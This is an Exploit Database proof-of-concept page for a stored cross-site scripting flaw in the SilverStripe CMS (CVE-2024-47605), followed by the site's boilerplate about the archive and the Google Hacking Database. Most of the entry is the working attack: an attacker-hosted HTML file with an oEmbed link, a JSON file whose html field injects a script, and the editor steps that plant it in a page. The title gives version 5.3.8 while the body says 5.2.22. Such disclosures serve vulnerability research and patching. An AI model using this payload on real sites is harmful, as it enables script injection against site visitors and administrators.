# Exploit Title: SilverStripe 5.3.8  - Stored Cross Site Scripting (XSS) (Authenticated)
# Date: 2025-01-15
# Exploit Author: James Nicoll
# Vendor Homepage: https://www.silverstripe.org/
# Software Link: https://www.silverstripe.org/download/
# Category: Web Application
# Version: 5.2.22
# Tested on: SilverStripe 5.2.22 - Ubuntu 24.04
# CVE : CVE-2024-47605

## Explanation:
When using the "insert media" functionality, the linked oEmbed JSON includes an HTML attribute which will replace the embed shortcode. The HTML is not sanitized before replacing the shortcode, allowing a script payload to be executed on both the CMS and the front-end of the website.

## Requirements
1. A Silverstripe CMS website.
2. Valid login credentials for a user with page edit rights.
3. An attacker server hosting malicious payload.

## On the attacker server:
1. Create an html file with oembded information:
```
<html>
  <head>
    <link rel="alternate" type="application/json+oembed" href="http://<attacker_server_ip>/oembed.json" title="Payload" />
  </head>
  <body>
    <img src="media.jpg">
  </body>
</html>
```
2. Create the json file with XSS payload:
```
{
    "title": "Title",
    "author_name": "author",
    "type": "video",
    "height": 113,
    "width": 200,
    "version": "1.0",
    "provider_name": "FakeSite",
    "thumbnail_height": 360,
    "thumbnail_width": 480,
    "thumbnail_url": "http://<attacker_server_ip>/media.jpg",
    "html":"<script>alert('hello world');</script>"
}
```
3. The media.jpg file can be any image.
4. Host these files on a publicly available website

## On the SilverStripe website:
1. Log into the admin portal with a user account that has page editor rights (or higher).
2. Select the page you wish to load the malicious content into.
3. Within the editor panel, select the "Insert Media via URL" button.
4. Enter the IP/Hostname of the attacker server.
5. Click Add Media, Insert Media, and then save and publish the page.
```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
